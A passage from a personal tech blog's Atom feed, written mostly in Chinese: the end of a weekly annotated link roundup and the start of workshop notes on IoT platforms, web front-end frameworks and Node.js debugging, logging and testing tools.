&lt;p&gt;Recently, I was browsing a post on Medium and I spotted a nice image loading effect. First, load a small blurry image, and then transition to the large image. I found it pretty neat and wanted to dissect how it was done.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;Web Front-end 的神奇魔法呀  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://twblg.dict.edu.tw/holodict_new/result_detail.jsp?n_no=60124&amp;amp;curpage=1&amp;amp;sample=%E6%9C%AA%E9%A3%9F%E4%BA%94%E6%97%A5%E7%AF%80%E7%B2%BD%EF%BC%8C%E7%A0%B4%E8%A3%98%E6%AF%8B%E7%94%98%E6%94%BE%E3%80%82&amp;amp;radiobutton=1&amp;amp;querytarget=1&amp;amp;limit=20&amp;amp;pagenum=1&amp;amp;rowcount=1"&gt;臺灣閩南語常用詞辭典&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「未食五日節粽，破裘毋甘放。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://note.hy31.net/?p=278"&gt;金融卡、信用卡 冷知識整理 | Henry的筆記集散地&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;真的沒看這篇之前都不知道這些東西呢  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="archlinux"></category><category term="blog"></category><category term="c"></category><category term="facebook"></category><category term="linux"></category><category term="math"></category><category term="python"></category><category term="security"></category><category term="taiwan"></category><category term="trivia"></category><category term="web"></category></entry><entry><title>Y2017W11</title><link href="https://blog.m157q.tw/posts/2017/03/20/y2017w11/" rel="alternate"></link><published>2017-04-22T17:59:30+08:00</published><updated>2017-04-22T17:59:30+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-03-20:posts/2017/03/20/y2017w11/</id><summary type="html">&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2017/03/crispr.html"&gt;高级人类的崛起 - 阮一峰的网络日志&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;CRISPR  &lt;/li&gt;
&lt;li&gt;人類要透過修改基因的技術自己創造出變種人了嗎？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://orson.tw/2017/02/26/%e8%aa%b0%e5%9f%b7%e6%94%bf%ef%bc%9f/"&gt;誰執政？ – 綠紅黃白黑&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;好像是個有趣的八卦  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;cli&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://opensource.googleblog.com/2017/03/python-fire-command-line.html"&gt;Google Open Source Blog: Introducing Python Fire, a library for automatically generating command line interfaces&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看了一下範例好像很好用  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/google/python-fire"&gt;https://github.com/google/python-fire&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2017/03/02/7162/usrbin-%e4%b8%8b%e7%9a%84%e5%b7%a5%e5%85%b7%e4%bb%8b%e7%b4%b9/"&gt;/usr/bin 下的工具介紹 | Gea-Suan Lin's BLOG&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://ablagoev.github.io/linux/adventures/commands/2017/02/19/adventures-in-usr-bin.html"&gt;Adventures in /usr/bin and the likes - Dormammu's Blog&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gcp&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.gcp.expert/cloudendure-vm-migration/"&gt;用 CloudEndure 一鍵完成VM搬家完全免費！ | GCP 雲端服務頂級合作夥伴 LIVEhouse.in&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GCP 真的是一直努力在搶 AWS 的客戶耶 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kamranahmedse/developer-roadmap"&gt;GitHub - kamranahmedse/developer-roadmap: Roadmap to becoming a web developer in 2017&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Web 工程師的技能樹  &lt;/li&gt;
&lt;li&gt;DevOps 真難當  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/bcicen/ctop"&gt;bcicen/ctop: Top-like interface for container metrics&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Top-like interface for container metrics ctop provides a concise and condensed overview of real-time metrics for multiple containers:  as well as an expanded view for inspecting a specific container.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;google&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2017/03/17/7191/google-%e7%9a%84-guetzli%ef%bc%8c%e5%b0%8d-jpeg-%e7%9a%84%e5%a3%93%e7%b8%ae%e6%bc%94%e7%ae%97%e6%b3%95/"&gt;Google 的 Guetzli，對 JPEG 的壓縮演算法 | Gea-Suan Lin's BLOG&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://opensource.googleblog.com/2017/03/guetzli-new-open-source-jpeg-encoder.html"&gt;Google Open Source Blog: Announcing Guetzli: A New Open Source JPEG Encoder&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;嗯 果然是用到了前陣子發布的 RNN-based 圖片壓縮演算法 RAISR  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;interview&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@KenjiChao/2016-17-%E7%BE%8E%E5%9C%8B%E8%BB%9F%E9%AB%94%E5%B7%A5%E7%A8%8B%E5%B8%AB%E6%B1%82%E8%81%B7%E5%BF%83%E5%BE%97-a5c00427fa73#.dhyvp598r"&gt;2016/17 美國軟體工程師求職心得 – Kenji Chao – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;每次看到美國軟體工作的面試心得都覺得好強啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;job&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Soft_Job/M.1489584667.A.6BC.html"&gt;Re: [請益] 非cs想走ai領域，投履歷沒公司理 - 看板 Soft_Job - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;算是給了想碰 Machine Learning 的門外漢一個方向  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/poteto/hiring-without-whiteboards"&gt;GitHub - poteto/hiring-without-whiteboards: ⭐️  Companies that don't have a broken hiring process&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;A listing of companies (or teams within companies) that don't do typical, CS based "whiteboard" interviews. Using sites like HackerRank probably fall into that category and won't be accepted.  &lt;/li&gt;
&lt;li&gt;因為 Twitter 上有一群寫程式的大老說自己根本無法通過白板面試，所以就有人建了一個 repo 收集那些不用白板面試的公司名單。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;life&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.byvoid.com/zht/blog/micronesia-pohnpei-1"&gt;波納佩島意外之旅（一） - BYVoid&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;到哪都有中國人 XD  &lt;/li&gt;
&lt;li&gt;飛個太平洋小島飛機要停五次  &lt;/li&gt;
&lt;li&gt;作者應該是在環遊世界吧  &lt;/li&gt;
&lt;li&gt;而且都是去比較少人去的地方  &lt;/li&gt;
&lt;li&gt;前陣子才在東歐  &lt;/li&gt;
&lt;li&gt;看看挺有趣的  &lt;/li&gt;
&lt;li&gt;畢竟可能一輩子都不會去  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://szlin.me/2017/03/13/linux-kernel-delay-sleep-%e5%bb%b6%e9%81%b2%e5%87%bd%e5%bc%8f%e5%ad%b8%e7%bf%92%e7%ad%86%e8%a8%88/"&gt;Linux Kernel delay/ sleep 延遲函式學習筆記 – SZ Lin  &amp;amp; Embedded Linux&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;atomic 用 delay  &lt;/li&gt;
&lt;li&gt;non-atomic 用 sleep  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;news&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://venturebeat.com/2017/03/15/gitlab-acquires-software-chat-startup-gitter-will-open-source-the-code/"&gt;GitLab acquires software chat startup Gitter, will open-source the code | VentureBeat | Dev | by Jordan Novet&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;o2o&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;對 O2O 不熟，所以看了些介紹  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.inside.com.tw/2015/03/02/jump-in-with-everyone-else-or-jump-right"&gt;不知道這兩項，別說你懂 O2O！ – INSIDE 硬塞的網路趨勢觀察&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;O2O，全名為 Online to Offline，是指將實體商務與電子商務做結合，透過網路無遠弗屆的力量尋找消費者，再藉由行銷活動或購買行為將消費者帶至實體通路。簡單來說，消費者在網上購買服務，在線下取得服務。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://wiki.mbalib.com/zh-tw/O2O%E8%90%A5%E9%94%80%E6%A8%A1%E5%BC%8F"&gt;O2O營銷模式 - MBA智库百科&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;O2O營銷模式又稱離線商務模式，是指線上營銷線上購買帶動線下經營和線下消費。O2O通過打折、提供信息、服務預訂等方式，把線下商店的消息推送給互聯網用戶，從而將他們轉換為自己的線下客戶，這就特別適合必須到  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://kkc.github.io/2017/02/19/reading-note-apprenticeship-patterns/"&gt;筆記：學徒模式，優秀軟體開發者的養成之路 | Kakashi's Notes&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;img alt="apprenticeship-patterns" src="/files/y2017w11/apprenticeship-patterns.png" /&gt;  &lt;/li&gt;
&lt;li&gt;期許自己也能做到  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.louie.lu/2017/02/18/pylivecap-%e6%93%b7%e5%8f%96-youtube-%e7%9b%b4%e6%92%ad%e5%bd%b1%e7%89%87-frame-%e4%b8%a6%e4%b8%94%e5%ad%98%e6%88%90%e5%9c%96%e7%89%87/"&gt;pylivecap - 擷取 YouTube 直播影片 frame 並且存成圖片 | louie_lu's blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/pynayzr/livestream-frame-capture"&gt;https://github.com/pynayzr/livestream-frame-capture&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://kb.hitcon.org/post/158546428972/%E5%8F%B0%E7%81%A3%E9%A7%AD%E5%AE%A2%E6%8C%91%E6%88%B0%E7%BE%8E%E5%9C%8Bcgc%E5%A4%A9%E7%B6%B2%E6%A9%9F%E5%99%A8%E4%BA%BA%E5%B0%88%E9%A1%8C%E7%B3%BB%E5%88%97%E5%A0%B1%E5%B0%8E%E5%8D%81%E4%B8%80%E8%BA%AB%E6%AD%B7%E5%85%B6%E5%A2%83cgc%E6%88%B0%E5%A0%B4%E5%B0%8E%E8%A6%BD"&gt;HITCON Knowledge Base - 台灣駭客挑戰美國CGC天網機器人專題系列報導(十一)：身歷其境，CGC戰場導覽&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;跟這系列的上一篇隔了半年  &lt;/li&gt;
&lt;li&gt;視覺化在資安比賽這塊也是挺重要的  &lt;/li&gt;
&lt;li&gt;不然旁人大概啥都看不懂  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2017/03/11/7171/%e9%80%8f%e9%81%8e%e6%89%8b%e6%a9%9f%e8%9e%a2%e5%b9%95%e4%b8%8a%e7%9a%84%e9%a4%98%e7%86%b1%e7%8c%9c%e6%b8%ac-pin-%e7%a2%bc/"&gt;透過手機螢幕上的餘熱猜測 PIN 碼 | Gea-Suan Lin's BLOG&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;在輸入完 PIN 碼的 30 秒內的準確度都還是很高 (80%)  &lt;/li&gt;
&lt;li&gt;這樣也行 真酷  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://exablue.de/blog/2017-03-15-github-enterprise-remote-code-execution.html"&gt;GitHub Enterprise Remote Code Execution&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Everyone uses GitHub. If you have huge amount of green paper or you are very paranoid about your code, you can run your own GitHub. For $2,500 USD per 10 user years you get GitHub Enterprise: A virtual machine containing a fully-featured GitHub instance.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://paragonie.com/blog/2017/03/jwt-json-web-tokens-is-bad-standard-that-everyone-should-avoid"&gt;JOSE (Javascript Object Signing and Encryption) is a Bad Standard That Everyone Should Avoid - Paragon Initiative Enterprises Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Note: This was originally written about JSON Web Tokens (JWT), but JWT is a subset of Javascript Object Signing and Encryption (JOSE) so these criticisms are more fairly focused at JOSE as a whole.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;software_development&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://teddy-chen-tw.blogspot.tw/2017/03/vs.html"&gt;搞笑談軟工: 價值 VS 技術&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;現實 VS 理想  &lt;/li&gt;
&lt;li&gt;麵包 VS 愛情  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;ducky&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.duckychannel.net/download/user_manual/One_backlit.pdf"&gt;Ducky-one_DKON1508S-DKON1687S_manual_V18_20160114&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;忘記手上這支 Ducky One 80% 的自定義設定了，所以做個紀錄。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.medicalnewstoday.com/articles/157333.php"&gt;Menstrual Cramps (Period Pains): Causes and Treatments - Medical News Today&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;指的其實不是月經  &lt;/li&gt;
&lt;li&gt;而是經痛啊  &lt;/li&gt;
&lt;li&gt;其他別名有 dysmenorrhea 或 period pains  &lt;/li&gt;
&lt;li&gt;https://t.co/buKVIXdZ3E  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="blog"></category><category term="cli"></category><category term="ducky"></category><category term="gcp"></category><category term="github"></category><category term="google"></category><category term="interview"></category><category term="job"></category><category term="life"></category><category term="linux"></category><category term="news"></category><category term="o2o"></category><category term="programmer"></category><category term="python"></category><category term="security"></category><category term="software_development"></category><category term="trivia"></category></entry><entry><title>Cat System Workshop #17 Full-Stack IoT Development 探索之旅</title><link href="https://blog.m157q.tw/posts/2017/03/14/cat-system-workshop-17-full-stack-iot-development-%E6%8E%A2%E7%B4%A2%E4%B9%8B%E6%97%85/" rel="alternate"></link><published>2017-03-14T22:31:17+08:00</published><updated>2017-03-14T22:31:17+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-03-14:posts/2017/03/14/cat-system-workshop-17-full-stack-iot-development-探索之旅/</id><summary type="html">&lt;p&gt;Speaker: &lt;a href="https://github.com/simenkid"&gt;Simen&lt;/a&gt;@&lt;a href="http://www.sivann.com.tw/"&gt;sivann&lt;/a&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;前半段是 IoT Development 相關&lt;br /&gt;
後半段則是 JavaScript Web development 和 Node.js 開發大全  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h3&gt;Google Weave&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://developers.google.com/weave/"&gt;https://developers.google.com/weave/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Android Things (Brillo)&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://developer.android.com/things/hardware/index.html"&gt;https://developer.android.com/things/hardware/index.html&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;專為 IoT 設計的 OS  &lt;/li&gt;
&lt;li&gt;35 MB RAM  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Apple HomeKit&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;體系相對封閉  &lt;/li&gt;
&lt;li&gt;語音助手 (Siri)  &lt;/li&gt;
&lt;li&gt;認証: MFi  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;iOS (SDK)&lt;br /&gt;
HomeKit API&lt;br /&gt;
HomeKit Accessory Protocol (HAP)  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Eclipse IoT Working Group&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Open Source and Open Standards for IoT  &lt;ul&gt;
&lt;li&gt;New and Existing Devices  &lt;/li&gt;
&lt;li&gt;IoT Gateways  &lt;/li&gt;
&lt;li&gt;Network Carriers  &lt;/li&gt;
&lt;li&gt;Backend Systems  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IoT Suite  &lt;ul&gt;
&lt;li&gt;oneM2M: REST interface  &lt;/li&gt;
&lt;li&gt;OMA LWM2M Server - Leshan  &lt;/li&gt;
&lt;li&gt;Gateway stack - Kura  &lt;/li&gt;
&lt;li&gt;CoAP - Californium (Java)  &lt;/li&gt;
&lt;li&gt;MQTT - Mosquitto/Paho  &lt;ul&gt;
&lt;li&gt;Paho 提供了不同語言實作的 MQTT client  &lt;ul&gt;
&lt;li&gt;有 C++, Java, JavaScript ...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MQTTSN (Eclipse 自己設計的)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Kura - IoT Gateway Stack/ App Framework&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Edge Nodes (clients, 連網的裝置)  &lt;ul&gt;
&lt;li&gt;Local Automation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;M2M Integration Platform  &lt;/li&gt;
&lt;li&gt;Enterprise Interfaces  &lt;ul&gt;
&lt;li&gt;Business Applications (Mobile Apps, Web Apps, ...)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Web Of Things&lt;/h3&gt;
&lt;h4&gt;Google Physical Web&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Eddystone  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Eddystone_(Google)"&gt;https://en.wikipedia.org/wiki/Eddystone_(Google)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/google/eddystone"&gt;https://github.com/google/eddystone&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.google.com/beacons/"&gt;https://developers.google.com/beacons/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MT7697  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;IoT Platform  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.aylanetworks.com/"&gt;Ayla&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://ubiworx.com/"&gt;ubiworx&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.smartthings.com/"&gt;SAMSUNG SmartThings&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Front-end and Back-end&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Web Front-end  &lt;ul&gt;
&lt;li&gt;Web 1.0  &lt;ul&gt;
&lt;li&gt;F5 刷新  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Web 2.0+  &lt;ul&gt;
&lt;li&gt;HTML RSP  &lt;/li&gt;
&lt;li&gt;AJAX  &lt;/li&gt;
&lt;li&gt;HTML5  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://tools.ietf.org/html/rfc6455"&gt;WS (WebSocket)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.w3.org/TR/2011/WD-eventsource-20110208/"&gt;SSE (Server-Sent Events)&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MVP (Web 2.0+)  &lt;ul&gt;
&lt;li&gt;代表性的案例：jQuery  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MVVM (Framework)  &lt;ul&gt;
&lt;li&gt;V (user), VM (framework), M &amp;lt;---client-side-----------server-side---&amp;gt; M  &lt;/li&gt;
&lt;li&gt;server 一有資料更新就會 push 過來或是背後會一直去跟 server 要資料，所以使用者端會覺得資料是即時的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;React.js  &lt;ul&gt;
&lt;li&gt;使用 JavaScript (JSX) 撰寫 View (React)  &lt;/li&gt;
&lt;li&gt;Virtual DOM  &lt;/li&gt;
&lt;li&gt;Controller View = View + State Machine + Controller  &lt;/li&gt;
&lt;li&gt;單向數據流架構化 (Flux)  &lt;/li&gt;
&lt;li&gt;單一數據源、狀態大總管 (Redux)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Web Back-end (JavaScript related)  &lt;ul&gt;
&lt;li&gt;Package Manager  &lt;/li&gt;
&lt;li&gt;Task Runner  &lt;ul&gt;
&lt;li&gt;grunt, gulp, npm, webpack  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pre-compiler Transpiler  &lt;/li&gt;
&lt;li&gt;Linter  &lt;/li&gt;
&lt;li&gt;Utils  &lt;/li&gt;
&lt;li&gt;Bundler  &lt;ul&gt;
&lt;li&gt;webpack, RequireJS (AMD), Browserify (CommonJS)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dev Server  &lt;ul&gt;
&lt;li&gt;uglify, watchify  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Node.js&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Server-side, JS runtime  &lt;/li&gt;
&lt;li&gt;Async I/O - libuv  &lt;/li&gt;
&lt;li&gt;Concurrenty - Event Loop  &lt;ul&gt;
&lt;li&gt;timers  &lt;/li&gt;
&lt;li&gt;I/O callbacks  &lt;/li&gt;
&lt;li&gt;idle, prepare  &lt;/li&gt;
&lt;li&gt;poll  &lt;/li&gt;
&lt;li&gt;check  &lt;/li&gt;
&lt;li&gt;close callbacks  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://simeneer.blogspot.tw/2016/09/nodejs-eventemitter.html"&gt;https://simeneer.blogspot.tw/2016/09/nodejs-eventemitter.html&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;除錯工具  &lt;ul&gt;
&lt;li&gt;原生除錯工具  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;break;&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ node debug app.js  # c, n, s, o&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第三方工具  &lt;ul&gt;
&lt;li&gt;node-inspector  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ node-debug app.js&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;iron-node  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ iron-node app.js&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;devtool  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ devtool app.js&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IDE 內建的除錯模組  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;除錯訊息與日誌 (Logging)  &lt;ul&gt;
&lt;li&gt;stdout / stderr [+ pipe][+ redirect]  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;console.log();&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;console.error();&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第三方模組  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ npm install debug --save&lt;/code&gt;, &lt;code&gt;$ DEBUG=namespace node app.js&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ npm install winston --save&lt;/code&gt;, &lt;code&gt;$ node app.js&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ npm install bunyan --save&lt;/code&gt;, &lt;code&gt;$ node app.js | bunyan [opts]&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ npm install pino --save&lt;/code&gt;, &lt;code&gt;$ node app.js | pino-&amp;lt;xxx&amp;gt;&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;號稱 Node.js 的 logging module 裡頭速度最快的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;intel, log4js, loggly, bole  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;測試框架/工具  &lt;ul&gt;
&lt;li&gt;Hosted CI Services  &lt;ul&gt;
&lt;li&gt;Travis CI, Circle CI, GitLab Ci, wercker, codeship  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Test Framework  &lt;ul&gt;
&lt;li&gt;mocha, jasmie-node, tape, tap  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Assertions  &lt;ul&gt;
&lt;li&gt;assert, should, expect, chai  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Test Double  &lt;ul&gt;
&lt;li&gt;sinon.js  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Code Coverage  &lt;ul&gt;
&lt;li&gt;istanbul, JSCover, blanket.js  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;物聯網大亂鬥&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Network Topology  &lt;ul&gt;
&lt;li&gt;p2p  &lt;/li&gt;
&lt;li&gt;star  &lt;ul&gt;
&lt;li&gt;目前的藍芽  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;star-of-star  &lt;/li&gt;
&lt;li&gt;Mesh  &lt;ul&gt;
&lt;li&gt;有自我修復的功能  &lt;/li&gt;
&lt;li&gt;ZigBee  &lt;ul&gt;
